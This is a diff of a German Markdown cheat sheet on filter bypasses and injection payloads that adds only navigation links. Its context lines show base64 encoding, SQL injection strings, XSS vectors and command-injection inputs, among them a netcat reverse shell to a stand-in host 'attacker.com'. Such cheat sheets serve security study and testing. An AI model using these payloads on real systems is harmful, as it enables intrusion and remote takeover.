@@ -47,6 +47,15 @@ Wird oft verwendet, um Sonderzeichen zu maskieren.
 
 
 
+
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
+
+
 ### 2. **Base64-Encoding**
 Nützlich bei Befehlseinschleusungen (z. B. in RCEs, SQLi).
 
@@ -57,6 +66,15 @@ echo base64_decode('ZWNobyAnSGFja2VkIQ==');
 → Ausgabe: echo 'Hacked!'
 ```
 
+
+
+
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
 
 
 ### 3. Hex-Encoding / Char-Bypass
@@ -153,12 +171,30 @@ ping -c 5 127.0.0.1
 - UNION SELECT NULL,NULL,NULL--
 - CONCAT(CHAR(117,115,101,114),CHAR(112,119))
 
+
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
+
+
 ### Remote Code Execution (RCE)
 ```bash
 127.0.0.1|echo hacked
 127.0.0.1;nc -e /bin/bash attacker.com 4444
 127.0.0.1&&sleep 5
 ```
+
+
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
+
 
 ### Cross-Site Scripting (XSS)
 
@@ -167,6 +203,15 @@ ping -c 5 127.0.0.1
 <script>alert(1)</script>
 <svg/onload=alert(document.domain)>
 ```
+
+
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
+
 
 ### Directory Traversal / LFI
 
